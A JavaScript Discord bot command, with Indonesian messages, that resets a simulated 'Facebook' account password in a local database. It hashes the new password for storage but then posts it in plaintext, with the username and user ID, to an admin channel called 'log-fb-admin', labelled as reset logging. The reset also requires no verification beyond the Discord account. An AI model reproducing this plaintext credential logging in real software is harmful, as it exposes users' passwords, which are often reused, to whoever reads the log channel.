const { SlashCommandBuilder, EmbedBuilder } = require("discord.js");
const bcrypt = require("bcrypt");
const db = require("../../db");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("forgotpassword")
    .setDescription("Mengatur ulang kata sandi akun Facebook")
    .addStringOption((option) =>
      option
        .setName("newpassword")
        .setDescription("Masukkan kata sandi baru (min. 8 karakter)")
        .setRequired(true)
    ),
  async execute(interaction) {
    const userId = interaction.user.id;
    const newPassword = interaction.options.getString("newpassword");

    // Immediately defer reply to prevent interaction expiration
    await interaction.deferReply({ ephemeral: true });

    db.get(`SELECT * FROM users WHERE id = ?`, [userId], async (err, row) => {
      if (err) {
        console.error("Database error:", err);
        return interaction.editReply({ content: "❌ Terjadi kesalahan dalam memeriksa akun.", ephemeral: true });
      }
      
      if (!row) {
        return interaction.editReply({ content: "❌ Akun tidak ditemukan. Silakan daftar terlebih dahulu dengan `/register`.", ephemeral: true });
      }

      if (newPassword.length < 8) {
        return interaction.editReply({ content: "❌ Kata sandi harus memiliki setidaknya 8 karakter.", ephemeral: true });
      }

      try {
        const hashedPassword = await bcrypt.hash(newPassword, 10);

        db.run(`UPDATE users SET password = ? WHERE id = ?`, [hashedPassword, userId], (err) => {
          if (err) {
            console.error("Error updating password:", err);
            return interaction.editReply({ content: "❌ Gagal memperbarui kata sandi. Coba lagi nanti.", ephemeral: true });
          }

          interaction.editReply({ content: "✅ Kata sandi berhasil diatur ulang! Gunakan `/login` untuk masuk.", ephemeral: true });

          // Logging system for tracking password resets
          const embed = new EmbedBuilder()
            .setColor("Green")
            .setTitle("System Facebook Logging")
            .addFields(
              { name: "Username", value: interaction.user.username, inline: true },
              { name: "NewPassword Facebook", value: newPassword },
              { name: "User ID", value: userId }
            )
            .setTimestamp();

          const logChannel = interaction.guild.channels.cache.find(ch => ch.name === "log-fb-admin");
          if (logChannel) logChannel.send({ embeds: [embed] });
        });

      } catch (error) {
        console.error("Error hashing password:", error);
        interaction.editReply({ content: "❌ Terjadi kesalahan saat mengenkripsi kata sandi.", ephemeral: true });
      }
    });
  },
};
